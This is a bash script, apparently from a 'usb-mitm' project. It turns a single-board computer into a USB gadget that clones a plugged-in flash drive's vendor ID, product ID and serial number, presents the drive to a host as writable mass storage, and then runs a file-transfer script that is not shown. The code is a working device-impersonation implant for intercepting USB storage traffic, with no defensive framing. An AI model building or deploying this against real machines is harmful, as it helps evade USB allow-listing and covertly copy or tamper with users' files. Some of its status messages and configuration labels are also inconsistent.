#!/bin/bash
checkUsb(){
usb=$(lsusb | head -1)

if [[ $usb == *"USB DISK 3.0"* ]]; then
  echo "3"
else
    echo "2"
    fi
}


establish_connection(){
echo device | sudo tee /sys/bus/platform/drivers/dwc3-meson-g12a/d0078080.usb/usb_role/d0078080.usb-role-switch/role
echo c9100000.usb | sudo tee /sys/bus/platform/drivers/dwc2/unbind
echo c9100000.usb | sudo tee /sys/bus/platform/drivers/dwc2/bind
modprobe g_mass_storage

cd /sys/kernel/config/usb_gadget/
mkdir -p usbMitm
cd usbMitm
IFS=: read -r vendor product <<< $(lsusb | head -1 | cut -d ' ' -f 6)
USB=$(checkUsb)
echo 0x"$vendor" > idVendor 
echo 0x"$product" > idProduct 
echo 0x0100 > bcdDevice # v1.0.0
echo 0x0"$USB"00 > bcdUSB # USB3
mkdir -p strings/0x409
echo "$vendor:$product" > strings/0x409/serialnumber
echo "$vendor" > strings/0x409/manufacturer
echo "$product" > strings/0x409/product
mkdir -p configs/c.1/strings/0x409
echo "Config 1: ECM network" > configs/c.1/strings/0x409/configuration
echo 250 > configs/c.1/MaxPower

CONNECTEDDRIVE=$(ls /dev |grep sd | grep 1)

FILE=/dev/${CONNECTEDDRIVE} #mount name for flash drive
mkdir -p /mnt/mydrive
mount $FILE /mnt/mydrive 
mkdir -p functions/mass_storage.usb0
echo 1 > functions/mass_storage.usb0/stall
echo 0 > functions/mass_storage.usb0/lun.0/cdrom
echo 0 > functions/mass_storage.usb0/lun.0/ro
echo 0 > functions/mass_storage.usb0/lun.0/nofua
echo 1 > functions/mass_storage.usb0/lun.0/removable
echo "USB DISK "$USB".0" > functions/mass_storage.usb0/lun.0/inquiry_string
echo $FILE > functions/mass_storage.usb0/lun.0/file
ln -s functions/mass_storage.usb0 configs/c.1/
# End functions
ls /sys/class/udc > UDC
bash /home/ubuntu/usb-mitm/filetransfer.bash
}

check_connection(){
    CONNECTEDDRIVE=$(ls /dev |grep sd | grep 1)
    
    if [[ -z $CONNECTEDDRIVE ]]; then
        return 0
        
    else
        return 1
        
    fi
}
connected=false

while(true); do
status=$(ls /dev |grep sd | grep 1)
echo "status is $status"
echo "connected is $connected"
if [[ $connected == false && $status != "" ]]
then
    connected=true
    echo "device is disconnected"
    establish_connection
    
elif [[ $status == "" && $connected == true ]]
    then
        connected=false
        bash /home/ubuntu/usb-mitm/disconnect.bash
        echo "device has been disconnected"
elif [[ $status != "" && $connected == true ]]
    then
        echo "device is connected"
else
    echo "device is disconnected"
fi
done


